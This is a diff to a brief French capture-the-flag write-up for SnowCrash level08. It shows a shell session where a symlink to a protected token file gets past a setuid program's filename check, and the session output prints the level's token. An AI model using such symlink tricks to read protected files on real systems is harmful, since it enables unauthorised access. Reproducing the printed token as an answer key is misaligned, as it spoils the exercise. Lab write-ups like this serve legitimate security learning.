@@ -1,1 +1,8 @@
-il suffit de renomer le fichier pour pouvoir le lire ou alors de creer un lien symbolique et d'ouvrir ce lien symbolique
+il suffit de creer un lien symbolique et d'ouvrir ce lien symbolique
+
+level08@SnowCrash:/tmp$ ln -s ~/token qwerty
+level08@SnowCrash:/tmp$ cat qwerty
+cat: qwerty: Permission denied
+level08@SnowCrash:/tmp$ ~/level08 qwerty
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:/tmp$
